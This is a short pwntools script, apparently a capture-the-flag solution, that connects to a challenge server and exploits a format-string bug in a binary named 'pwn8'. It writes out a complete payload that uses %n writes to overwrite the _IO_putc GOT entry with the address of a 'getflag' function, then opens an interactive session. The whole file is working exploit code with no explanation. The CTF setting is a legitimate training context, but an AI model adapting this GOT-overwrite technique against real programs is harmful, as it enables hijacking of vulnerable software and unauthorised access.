from pwn import *

#context.log_level = 'debug'

#p = process('./pwn8')
p = remote('ctf.cnss.studio', 5008)
elf = ELF('pwn8')

putc_got_addr = elf.got['_IO_putc']
getflag_entry = elf.symbols['getflag']
print 'putc_got_addr = ' + hex(putc_got_addr)
print 'getflag_entry = ' + hex(getflag_entry)

cb = getflag_entry
a3 = (cb >> 24) & 0xff
a2 = (cb >> 16) & 0xff
a1 = (cb >> 8) & 0xff
a0 = cb & 0xff

payload = p32(putc_got_addr) + p32(putc_got_addr+1)
payload += p32(putc_got_addr+2) + p32(putc_got_addr+3)
payload += '%' + str(a0-16) + 'x%4$n'
payload += '%' + str(0x100+(a1-a0)) + 'x%5$n'
payload += '%' + str(0x100+(a2-a1)) + 'x%6$n'
payload += '%' + str(0x100+(a3-a2)) + 'x%7$n'

p.sendline(payload)

p.interactive()
